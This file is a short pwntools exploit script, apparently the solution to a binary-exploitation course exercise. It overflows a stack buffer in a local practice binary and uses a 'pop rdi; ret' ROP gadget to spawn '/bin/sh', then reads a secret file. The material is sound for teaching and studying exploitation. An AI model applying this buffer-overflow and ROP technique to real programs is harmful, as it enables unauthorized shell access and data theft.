#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./gadget-exercise2.bin")

    # The following lines give us "pop rdi; ret" gadget at 0x4007b3.
    rop = ROP("./gadget-exercise2.bin")
    print(rop.rdi)

    rdi_gadget = b"\xb3\x07\x40" + b"\x00" * 5
    safe_address = b"\x97\x06\x40" + b"\x00" * 5
    #rdi_gadget = p64(0x4007b3) # You can also write more concisely like this.
    
    print(p.recvuntil(b"stack buffer: "))
    p.send(b"b" * 0x28 + safe_address + rdi_gadget + b"\x80\x10\x60" + b"\x00" * 5 + b"\x76\x06\x40" + b"\x00" * 5)
    print(p.recvuntil(b"global buffer: "))
    p.send(b"/bin/sh" + b"\x00")

    sleep(0.2)
    p.sendline(b"cat secret.txt")
    print(p.recvline())


if __name__ == "__main__":
    exploit()
